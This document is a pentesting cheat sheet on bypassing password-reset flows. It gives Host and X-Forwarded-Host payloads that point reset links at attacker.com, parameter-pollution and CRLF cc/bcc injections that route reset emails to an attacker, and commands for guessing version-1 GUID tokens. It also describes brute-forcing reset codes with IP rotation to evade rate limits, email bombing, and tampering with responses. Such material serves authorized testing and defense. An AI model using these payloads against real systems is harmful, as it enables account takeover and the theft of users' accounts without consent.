# Reset Password Bypass

## Password Reset Poisoning
If you find a host header attack and it’s out of scope, try to find the password reset button!
* Intercept the password reset request in Burpsuite
* Add following header or edit header in burpsuite(try one by one)
```javascript
Host: attacker.com
```
```javascript
Host: target.com
X-Forwarded-Host: attacker.com

```
```javascript
 Host: target.com
 Host: attacker.com
```
* Check if the link to change the password inside the email is pointing to attacker.com

## Password Reset By Manipulating Email Parameter
* Add attacker email as second parameter using &
```javascript
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```

* Add attacker email as second parameter using %20
```javascript
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```

* Add attacker email as second parameter using |
```javascript
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```

* Add attacker email as second parameter using cc
```javascript
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

* Add attacker email as second parameter using bcc
```javascript
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```

* Add attacker email as second parameter using ,
```javascript
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```

* Add attacker email as second parameter in json array
```javascript
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```

## Changing Email And Password of any User through API Parameters
1. Attacker have to login with their account and Go to the Change password function
2. Start the Burp Suite and Intercept the request
3. After intercepting the request sent it to repeater and modify parameters Email and Password
```javascript
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```

## No Rate Limiting: Email Bombing
1. Start the Burp Suite and Intercept the password reset request
2. Send to intruder
3. Use null payload

## Find out How Password Reset Token is Generated
pattern of password reset token

If it
* Generated based Timestamp
* Generated based on the UserID
* Generated based on email of User
* Generated based on Firstname and Lastname
* Generated based on Date of Birth
* Generated based on Cryptography

**Use Burp Sequencer to find the randomness or predictability of tokens**


## Guessable GUID
There are different types of GUIDs:
* Version 0: Only seen in the nil GUID ("00000000-0000-0000-0000-000000000000").
* Version 1: The GUID is generated in a predictable manner based on:
  * The current time
  * A randomly generated "clock sequence" which remains constant between GUIDs during the uptime of the generating system
  * A "node ID", which is generated based on the system's MAC address if it is available
* Version 3: The GUID is generated using an MD5 hash of a provided name and namespace.
* Version 4: The GUID is randomly generated.
* Version 5: The GUID is generated using a SHA1 hash of a provided name and namespace.

Tools: [guidtool](https://github.com/intruder-io/guidtool)
```bash
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426

```
If the used version to generate a reset password GUID is the version 1, it's possible to bruteforce GUIDS:
```bash
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c

```

## Response manipulation: Replace Bad Response With Good One
Look for Request and Response like these
```javascript
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)

// Change Response
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)

```

## Using Expired Token
* Check if the expired token can be reused


## Brute Force Password Rest token
Try to bruteforce the reset token using Burpsuite
```javascript
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$

```
* Use IP-Rotator on burpsuite to bypass IP based ratelimit.

## Try Using Your Token
* Try adding your password reset token with victim’s Account
```javascript
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$

```

## Session Invalidation in Logout/Password Reset
When a user logs out or reset his password, the current session should be invalidated.
Therefore, grab the cookies while the user is logged in, log out, and check if the cookies are still valid.

Repeat the process changing the password instead of logging out.


## Reset Token expiration Time
The reset tokens must have an expiration time, after it the token shouldn't be valid to change the password of a user.


## Extra Checks
* Use username@burp_collab.net and analyze the callback
* User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* Long password (>200) leads to DoS
* Append second email param and value


















